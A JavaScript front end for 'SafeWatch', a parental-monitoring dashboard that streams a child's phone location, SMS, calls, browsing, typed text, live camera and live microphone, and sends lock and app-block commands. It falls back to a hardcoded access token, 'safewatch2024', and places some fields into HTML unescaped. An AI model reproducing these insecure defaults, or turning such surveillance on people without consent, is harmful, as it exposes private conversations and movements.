/* ═══════════════════════════════════════════════════════════════════
   SafeWatch Dashboard — app.js v3
   Full handler for all 12 data types + Leaflet map + audio playback
   ═══════════════════════════════════════════════════════════════════ */

(function () {
    'use strict';

    // ─── State ────────────────────────────────────────────────────────
    let ws = null;
    let map = null;
    let mapMarker = null;
    let mapInitialised = false;
    let cameraFrameCount = 0;
    let lastFrameTime = 0;
    let audioContext = null;
    let audioQueue = [];
    let isPlayingAudio = false;
    let blockedApps = new Set();
    let touchEventLog = [];
    const MAX_TOUCH_LOG = 500;

    // FPS tracking
    let fpsFrames = 0;
    let fpsStart = Date.now();

    // ─── DOM refs ─────────────────────────────────────────────────────
    const statusDot    = document.getElementById('status-dot');
    const statusText   = document.getElementById('status-text');
    const childDot     = document.getElementById('child-dot');
    const childText    = document.getElementById('child-status-text');
    const activityFeed = document.getElementById('activity-feed');
    const touchFeed    = document.getElementById('touch-feed');
    const pageTitle    = document.getElementById('page-title');
    const lastUpdate   = document.getElementById('last-update');

    // ─── Navigation ───────────────────────────────────────────────────
    const navItems = document.querySelectorAll('.nav-item');
    const views    = document.querySelectorAll('.view');

    const PAGE_TITLES = {
        overview: 'Overview', battery: 'Battery & Device', network: 'Network / IP',
        location: 'Live Location', apps: 'App Control', websites: 'Website History',
        calls: 'Call Logs', sms: 'SMS Logs', storage: 'Storage Manager',
        camera: 'Live Camera', mic: 'Live Microphone', touch: 'Touch Activity'
    };

    navItems.forEach(item => {
        item.addEventListener('click', e => {
            e.preventDefault();
            const target = item.dataset.target;
            navItems.forEach(n => n.classList.remove('active'));
            views.forEach(v => v.classList.remove('active'));
            item.classList.add('active');
            document.getElementById(`view-${target}`)?.classList.add('active');
            pageTitle.textContent = PAGE_TITLES[target] || target;

            // Init map when location tab is first opened
            if (target === 'location' && !mapInitialised) initMap();
        });
    });

    // Summary card clicks → navigate to relevant panel
    document.getElementById('sc-battery')?.addEventListener('click', () => switchTab('battery'));
    document.getElementById('sc-location')?.addEventListener('click', () => switchTab('location'));
    document.getElementById('sc-network')?.addEventListener('click', () => switchTab('network'));
    document.getElementById('sc-storage')?.addEventListener('click', () => switchTab('storage'));
    document.getElementById('sc-calls')?.addEventListener('click', () => switchTab('calls'));
    document.getElementById('sc-active-app')?.addEventListener('click', () => switchTab('apps'));

    function switchTab(target) {
        navItems.forEach(n => n.classList.remove('active'));
        views.forEach(v => v.classList.remove('active'));
        document.getElementById(`nav-${target}`)?.classList.add('active');
        document.getElementById(`view-${target}`)?.classList.add('active');
        pageTitle.textContent = PAGE_TITLES[target] || target;
        if (target === 'location' && !mapInitialised) initMap();
    }

    // ─── WebSocket ────────────────────────────────────────────────────
    /**
     * Auto-detects the relay server WebSocket URL from the page's own host.
     * When the dashboard is served from Render, window.location.host is the
     * Render URL, so wss://<host>/ws/parent is always correct — no manual input.
     *
     * Token priority: ?token= query param → hardcoded default.
     */
    function buildWsUrl() {
        const isSecure = window.location.protocol === 'https:';
        const wsProto  = isSecure ? 'wss' : 'ws';
        const host     = window.location.host; // e.g. safewatch-abc.onrender.com

        // Allow override via query string for debugging: ?token=mytoken
        const urlParams = new URLSearchParams(window.location.search);
        const token = urlParams.get('token') || 'safewatch2024';

        return `${wsProto}://${host}/ws/parent?token=${token}`;
    }


    function connect() {
        if (ws) { try { ws.close(); } catch(e) {} }
        const url = buildWsUrl();

        // Update the server host display label
        const hostDisplay = document.getElementById('server-host-display');
        if (hostDisplay) hostDisplay.textContent = window.location.host || 'localhost';

        addActivity(`Connecting to relay…`, 'system');
        ws = new WebSocket(url);

        ws.onopen = () => {
            setServerStatus(true);
            addActivity('Connected to relay server', 'system');
        };

        ws.onclose = () => {
            setServerStatus(false);
            addActivity('Disconnected — retrying in 5s…', 'system');
            setTimeout(connect, 5000);
        };

        ws.onerror = () => {
            addActivity('WebSocket error', 'system');
        };

        ws.onmessage = event => {
            if (typeof event.data === 'string') {
                try {
                    handleData(JSON.parse(event.data));
                } catch(e) {
                    addActivity(`Raw: ${event.data.substring(0,80)}`, 'data');
                }
            } else {
                // Binary — currently not used (camera/audio sent as JSON base64)
            }
        };
    }

    document.getElementById('btnReconnect').addEventListener('click', connect);

    // ─── Data Dispatch ────────────────────────────────────────────────
    function handleData(data) {
        const ts = new Date().toLocaleTimeString();
        lastUpdate.textContent = `Last update: ${ts}`;

        switch (data.type) {
            case 'child_status':    handleChildStatus(data); break;
            case 'battery':         handleBattery(data); break;
            case 'network':         handleNetwork(data); break;
            case 'location':        handleLocation(data); break;
            case 'calls':           handleCalls(data); break;
            case 'sms':             handleSms(data); break;
            case 'app_usage':       handleAppUsage(data); break;
            case 'installed_apps':  handleInstalledApps(data); break;
            case 'storage':         handleStorage(data); break;
            case 'camera_frame':    handleCameraFrame(data); break;
            case 'audio_chunk':     handleAudioChunk(data); break;
            case 'touch_event':     handleTouchEvent(data); break;
            case 'website_visit':   handleWebsiteVisit(data); break;
            default:
                addActivity(`Unknown type: ${data.type}`, 'data');
        }
    }

    // ─── Child Status ─────────────────────────────────────────────────
    function handleChildStatus(data) {
        const online = data.online;
        childDot.className = `child-dot ${online ? 'online' : 'offline'}`;
        childText.textContent = online ? 'Child Online' : 'Child Offline';
        addActivity(online ? '📱 Child device connected!' : '📴 Child device disconnected', 'system');
    }

    // ─── Battery ──────────────────────────────────────────────────────
    function handleBattery(data) {
        const pct = data.percentage;
        setText('bat-percent', pct);
        setText('bat-status', data.status);
        setText('bat-source', data.chargeSource);
        setText('bat-health', data.health);
        setText('bat-temp', `${data.temperatureC}°C`);
        setText('bat-voltage', `${data.voltageV}V`);
        setText('ov-battery', `${pct}% — ${data.status}`);

        // Animate battery ring
        const circumference = 314; // 2π × 50
        const offset = circumference - (pct / 100) * circumference;
        const fill = document.getElementById('battery-ring-fill');
        if (fill) {
            fill.style.strokeDashoffset = offset;
            fill.style.stroke = pct > 50 ? '#10b981' : pct > 20 ? '#f59e0b' : '#ef4444';
        }

        addActivity(`🔋 Battery: ${pct}% (${data.status})`, 'data');
    }

    // ─── Network ──────────────────────────────────────────────────────
    function handleNetwork(data) {
        setText('net-type',    data.networkType);
        setText('net-ssid',    data.ssid);
        setText('net-wifi-ip', data.wifiIp);
        setText('net-carrier', data.carrierName || 'N/A');
        setText('net-all-ips', data.allIps || '—');
        setText('ov-network',  `${data.networkType} — ${data.wifiIp}`);
        addActivity(`📡 Network: ${data.networkType} (${data.wifiIp})`, 'data');
    }

    // ─── Location ─────────────────────────────────────────────────────
    function handleLocation(data) {
        const lat = data.lat.toFixed(6);
        const lng = data.lng.toFixed(6);
        setText('loc-lat',      lat);
        setText('loc-lng',      lng);
        setText('loc-accuracy', `${data.accuracy?.toFixed(1)} m`);
        setText('loc-altitude', `${data.altitude?.toFixed(1)} m`);
        setText('loc-speed',    `${(data.speed * 3.6)?.toFixed(1)} km/h`);
        setText('loc-provider', data.provider);
        setText('loc-updated',  new Date(data.ts).toLocaleTimeString());
        setText('ov-location',  `${lat}, ${lng}`);

        const mapsLink = document.getElementById('loc-maps-link');
        if (mapsLink) mapsLink.href = `https://www.google.com/maps?q=${data.lat},${data.lng}`;

        // Update Leaflet map
        if (mapInitialised && map) {
            if (mapMarker) {
                mapMarker.setLatLng([data.lat, data.lng]);
            } else {
                mapMarker = L.marker([data.lat, data.lng], {
                    icon: L.divIcon({
                        className: '',
                        html: '<div style="width:16px;height:16px;background:#6366f1;border:3px solid white;border-radius:50%;box-shadow:0 0 12px rgba(99,102,241,0.8)"></div>',
                        iconSize: [16, 16],
                        iconAnchor: [8, 8]
                    })
                }).addTo(map)
                  .bindPopup(`<b>Child Location</b><br>Accuracy: ${data.accuracy?.toFixed(0)}m<br>${new Date(data.ts).toLocaleTimeString()}`);
            }
            map.setView([data.lat, data.lng], map.getZoom() < 12 ? 15 : map.getZoom());
        }

        addActivity(`📍 Location updated: ${lat}, ${lng}`, 'data');
    }

    function initMap() {
        if (mapInitialised) return;
        map = L.map('leaflet-map', {
            center: [0, 0],
            zoom: 2,
            zoomControl: true
        });
        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
            attribution: '© OpenStreetMap',
            maxZoom: 19
        }).addTo(map);
        mapInitialised = true;
    }

    // ─── Calls ────────────────────────────────────────────────────────
    function handleCalls(data) {
        const tbody = document.getElementById('calls-tbody');
        if (!tbody) return;
        tbody.innerHTML = '';

        if (!data.logs || data.logs.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" class="empty">No call logs received</td></tr>';
            return;
        }

        setText('ov-calls', `${data.logs[0]?.name || data.logs[0]?.number || '—'}`);
        const badgeMap = { Incoming: 'badge-green', Outgoing: 'badge-blue', Missed: 'badge-red', Rejected: 'badge-red', Blocked: 'badge-orange' };

        data.logs.forEach(log => {
            const tr = document.createElement('tr');
            const badge = badgeMap[log.callType] || 'badge-blue';
            tr.innerHTML = `
                <td>${log.name || log.number || '—'}</td>
                <td><span class="badge ${badge}">${log.callType}</span></td>
                <td>${formatDuration(log.duration)}</td>
                <td>${new Date(log.date).toLocaleString()}</td>
            `;
            tbody.appendChild(tr);
        });
        addActivity(`📞 ${data.count} call logs received`, 'data');
    }

    // ─── SMS ──────────────────────────────────────────────────────────
    function handleSms(data) {
        const tbody = document.getElementById('sms-tbody');
        if (!tbody) return;
        tbody.innerHTML = '';

        if (!data.messages || data.messages.length === 0) {
            tbody.innerHTML = '<tr><td colspan="4" class="empty">No SMS messages received</td></tr>';
            return;
        }

        data.messages.forEach(msg => {
            const tr = document.createElement('tr');
            const badge = msg.type === 'Sent' ? 'badge-blue' : 'badge-green';
            tr.innerHTML = `
                <td>${msg.address || '—'}</td>
                <td><span class="badge ${badge}">${msg.type}</span></td>
                <td style="max-width:300px;overflow:hidden;text-overflow:ellipsis">${escapeHtml(msg.body)}</td>
                <td>${new Date(msg.date).toLocaleString()}</td>
            `;
            tbody.appendChild(tr);
        });
        addActivity(`💬 ${data.count} SMS messages received`, 'data');
    }

    // ─── App Usage ────────────────────────────────────────────────────
    function handleAppUsage(data) {
        const appList = document.getElementById('app-list');
        if (!appList) return;
        appList.innerHTML = '';

        if (!data.apps || data.apps.length === 0) {
            appList.innerHTML = '<div class="empty-state">No app usage data</div>';
            return;
        }

        const maxMinutes = data.apps[0]?.totalMinutes || 1;
        setText('ov-active-app', data.apps[0]?.appName || '—');

        data.apps.forEach(app => {
            const isBlocked = blockedApps.has(app.packageName);
            const div = document.createElement('div');
            div.className = 'app-item';
            div.dataset.pkg = app.packageName;
            div.innerHTML = `
                <div class="app-icon-placeholder">📱</div>
                <div class="app-details">
                    <div class="app-name">${escapeHtml(app.appName)}</div>
                    <div class="app-pkg">${app.packageName}</div>
                </div>
                <div class="app-time">${app.totalMinutes}m</div>
                <label class="toggle-switch" title="${isBlocked ? 'Blocked' : 'Allowed'} — toggle to ${isBlocked ? 'unblock' : 'block'}">
                    <input type="checkbox" class="app-block-toggle" data-pkg="${app.packageName}" ${isBlocked ? '' : 'checked'}>
                    <span class="slider"></span>
                </label>
            `;
            appList.appendChild(div);
        });

        // Attach toggle listeners
        document.querySelectorAll('.app-block-toggle').forEach(toggle => {
            toggle.addEventListener('change', e => {
                const pkg = e.target.dataset.pkg;
                const allowed = e.target.checked;
                if (allowed) {
                    blockedApps.delete(pkg);
                    sendCommand({ command: 'UNBLOCK_APP', package: pkg });
                    addActivity(`✅ Unblocked: ${pkg}`, 'command');
                } else {
                    blockedApps.add(pkg);
                    sendCommand({ command: 'BLOCK_APP', package: pkg });
                    addActivity(`🚫 Blocked: ${pkg}`, 'command');
                }
            });
        });

        addActivity(`📱 ${data.count} apps usage data received`, 'data');
    }

    function handleInstalledApps(data) {
        // Could supplement app list — just log for now
        addActivity(`📋 ${data.count} installed apps reported`, 'data');
    }

    // ─── Storage ──────────────────────────────────────────────────────
    function handleStorage(data) {
        if (data.internal) {
            const int = data.internal;
            const pct = int.usedPercent || 0;
            const fillEl = document.getElementById('storage-bar-int');
            if (fillEl) fillEl.style.width = `${pct}%`;
            setText('storage-int-text', `${int.usedGB} GB used of ${int.totalGB} GB`);
            setText('stor-int-total', `${int.totalGB} GB`);
            setText('stor-int-used',  `${int.usedGB} GB`);
            setText('stor-int-free',  `${int.freeGB} GB`);
            setText('ov-storage', `${int.usedGB} / ${int.totalGB} GB`);
        }

        if (data.breakdown && data.breakdown.length > 0) {
            const bd = document.getElementById('storage-breakdown');
            if (bd) {
                const maxMB = Math.max(...data.breakdown.map(c => c.sizeMB), 1);
                bd.innerHTML = data.breakdown.map(cat => `
                    <div class="category-bar">
                        <span class="category-bar-label">${cat.category}</span>
                        <div class="category-bar-track">
                            <div class="category-bar-fill" style="width:${(cat.sizeMB/maxMB*100).toFixed(0)}%"></div>
                        </div>
                        <span class="category-bar-value">${cat.sizeMB} MB</span>
                    </div>
                `).join('');
            }
        }
        addActivity(`💾 Storage data updated`, 'data');
    }

    // ─── Camera ───────────────────────────────────────────────────────
    function handleCameraFrame(data) {
        const feed = document.getElementById('camera-feed');
        const placeholder = document.getElementById('camera-placeholder');
        if (!feed) return;

        feed.src = `data:image/jpeg;base64,${data.data}`;
        feed.style.display = 'block';
        if (placeholder) placeholder.style.display = 'none';

        cameraFrameCount++;
        document.getElementById('cam-frame-count').textContent = `${cameraFrameCount} frames received`;
        document.getElementById('cam-last-update').textContent = `Last: ${new Date().toLocaleTimeString()}`;

        // FPS calc
        fpsFrames++;
        const now = Date.now();
        if (now - fpsStart >= 2000) {
            const fps = (fpsFrames / ((now - fpsStart) / 1000)).toFixed(1);
            document.getElementById('camera-fps').textContent = `${fps} fps`;
            fpsFrames = 0;
            fpsStart = now;
        }
    }

    // ─── Audio ────────────────────────────────────────────────────────
    function handleAudioChunk(data) {
        const canvas = document.getElementById('audio-canvas');
        const placeholder = document.getElementById('mic-placeholder');
        if (canvas) canvas.style.display = 'block';
        if (placeholder) placeholder.style.display = 'none';

        // Decode base64 → PCM → visualize
        try {
            const raw = atob(data.data);
            const bytes = new Uint8Array(raw.length);
            for (let i = 0; i < raw.length; i++) bytes[i] = raw.charCodeAt(i);

            // Interpret as 16-bit PCM
            const pcm = new Int16Array(bytes.buffer);
            drawAudioWave(canvas, pcm);

            // Web Audio playback
            playPcmChunk(pcm, data.sampleRate || 16000);
        } catch(e) {
            console.warn('Audio decode error:', e);
        }
    }

    function drawAudioWave(canvas, pcm) {
        const ctx = canvas.getContext('2d');
        const W = canvas.width;
        const H = canvas.height;

        ctx.fillStyle = 'rgba(0,0,0,0.5)';
        ctx.fillRect(0, 0, W, H);

        ctx.strokeStyle = '#6366f1';
        ctx.lineWidth = 2;
        ctx.shadowBlur = 8;
        ctx.shadowColor = '#6366f1';
        ctx.beginPath();

        const step = Math.max(1, Math.floor(pcm.length / W));
        for (let x = 0; x < W; x++) {
            const idx = x * step;
            const v = pcm[idx] / 32768;
            const y = (v + 1) / 2 * H;
            x === 0 ? ctx.moveTo(x, y) : ctx.lineTo(x, y);
        }
        ctx.stroke();
        ctx.shadowBlur = 0;
    }

    function playPcmChunk(pcm, sampleRate) {
        if (!audioContext) {
            audioContext = new (window.AudioContext || window.webkitAudioContext)({ sampleRate });
        }
        const buffer = audioContext.createBuffer(1, pcm.length, sampleRate);
        const channelData = buffer.getChannelData(0);
        for (let i = 0; i < pcm.length; i++) {
            channelData[i] = pcm[i] / 32768;
        }
        const source = audioContext.createBufferSource();
        source.buffer = buffer;
        source.connect(audioContext.destination);
        source.start();
    }

    // ─── Touch Activity ───────────────────────────────────────────────
    function handleTouchEvent(data) {
        touchEventLog.unshift(data);
        if (touchEventLog.length > MAX_TOUCH_LOG) touchEventLog.pop();
        renderTouchFeed();
        // Also add to overview feed for important events
        if (['APP_BLOCKED', 'TEXT_INPUT'].includes(data.eventType)) {
            addActivity(`${data.eventType}: ${data.description?.substring(0,60)}`, 'data');
        }
    }

    function renderTouchFeed() {
        const filter = document.getElementById('touch-filter')?.value || 'all';
        const filtered = filter === 'all' ? touchEventLog : touchEventLog.filter(e => e.eventType === filter);

        const existing = touchFeed.children.length;
        if (existing === 0 || filtered.length !== existing) {
            touchFeed.innerHTML = '';
            if (filtered.length === 0) {
                touchFeed.innerHTML = '<li class="feed-item system">No events match the current filter.</li>';
                return;
            }
            filtered.slice(0, 200).forEach(event => {
                const li = document.createElement('li');
                li.className = `feed-item ${event.eventType}`;
                li.innerHTML = `
                    <span class="event-type">${event.eventType}</span>
                    <span>${escapeHtml(event.description?.substring(0,120) || '')}</span>
                    <span class="event-time">${new Date(event.ts).toLocaleTimeString()}</span>
                `;
                touchFeed.appendChild(li);
            });
        }
    }

    document.getElementById('touch-filter')?.addEventListener('change', renderTouchFeed);
    document.getElementById('btn-clear-touch')?.addEventListener('click', () => {
        touchEventLog = [];
        touchFeed.innerHTML = '<li class="feed-item system">Log cleared.</li>';
    });

    // ─── Website History ──────────────────────────────────────────────
    function handleWebsiteVisit(data) {
        const tbody = document.getElementById('websites-tbody');
        if (!tbody) return;

        if (tbody.children[0]?.classList.contains('empty')) tbody.innerHTML = '';

        const tr = document.createElement('tr');
        tr.innerHTML = `
            <td style="max-width:280px;overflow:hidden;text-overflow:ellipsis">
                <a href="${escapeHtml(data.url)}" target="_blank" style="color:#818cf8">${escapeHtml(data.url)}</a>
            </td>
            <td>${data.browser?.split('.').pop() || '—'}</td>
            <td>${new Date(data.ts).toLocaleTimeString()}</td>
        `;
        tbody.insertBefore(tr, tbody.firstChild);

        // Keep last 200
        while (tbody.children.length > 200) tbody.removeChild(tbody.lastChild);

        addActivity(`🌐 Visited: ${data.url?.substring(0, 60)}`, 'data');
    }

    // ─── Commands ─────────────────────────────────────────────────────
    function sendCommand(obj) {
        if (ws && ws.readyState === WebSocket.OPEN) {
            ws.send(JSON.stringify(obj));
        } else {
            addActivity('❌ Cannot send command — not connected', 'command');
        }
    }

    document.getElementById('btn-lock')?.addEventListener('click', () => {
        if (!confirm('Lock the child\'s device now?')) return;
        sendCommand({ command: 'LOCK_DEVICE' });
        addActivity('🔒 LOCK_DEVICE command sent', 'command');
    });

    document.getElementById('btn-snapshot')?.addEventListener('click', () => {
        sendCommand({ command: 'GET_SNAPSHOT' });
        addActivity('🔄 Snapshot requested', 'system');
    });

    document.getElementById('btn-camera-on')?.addEventListener('click', () => {
        sendCommand({ command: 'START_CAMERA' });
        document.getElementById('btn-camera-on').style.display  = 'none';
        document.getElementById('btn-camera-off').style.display = '';
        addActivity('📷 Camera started', 'command');
    });
    document.getElementById('btn-camera-off')?.addEventListener('click', () => {
        sendCommand({ command: 'STOP_CAMERA' });
        document.getElementById('btn-camera-on').style.display  = '';
        document.getElementById('btn-camera-off').style.display = 'none';
        document.getElementById('camera-feed').style.display = 'none';
        document.getElementById('camera-placeholder').style.display = '';
        addActivity('📷 Camera stopped', 'command');
    });

    document.getElementById('btn-mic-on')?.addEventListener('click', () => {
        if (!confirm('Start live microphone monitoring?\nAudio will be streamed to this browser.')) return;
        sendCommand({ command: 'START_MIC' });
        document.getElementById('btn-mic-on').style.display  = 'none';
        document.getElementById('btn-mic-off').style.display = '';
        addActivity('🎤 Mic started', 'command');
    });
    document.getElementById('btn-mic-off')?.addEventListener('click', () => {
        sendCommand({ command: 'STOP_MIC' });
        document.getElementById('btn-mic-on').style.display  = '';
        document.getElementById('btn-mic-off').style.display = 'none';
        const canvas = document.getElementById('audio-canvas');
        if (canvas) canvas.style.display = 'none';
        document.getElementById('mic-placeholder').style.display = '';
        addActivity('🎤 Mic stopped', 'command');
    });

    // ─── UI Helpers ───────────────────────────────────────────────────
    function setServerStatus(connected) {
        statusDot.className  = `status-dot ${connected ? 'online' : 'offline'}`;
        statusText.textContent = connected ? 'Connected (Parent)' : 'Disconnected';
    }

    function addActivity(message, type = 'system') {
        const li = document.createElement('li');
        li.className = `feed-item ${type}`;
        li.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
        activityFeed.insertBefore(li, activityFeed.firstChild);
        if (activityFeed.children.length > 100) activityFeed.removeChild(activityFeed.lastChild);
    }

    function setText(id, value) {
        const el = document.getElementById(id);
        if (el) el.textContent = value ?? '—';
    }

    function formatDuration(seconds) {
        if (!seconds) return '0s';
        if (seconds < 60) return `${seconds}s`;
        return `${Math.floor(seconds / 60)}m ${seconds % 60}s`;
    }

    function escapeHtml(str) {
        if (!str) return '';
        return str.replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
    }

    // ─── Boot ─────────────────────────────────────────────────────────
    connect();

})();
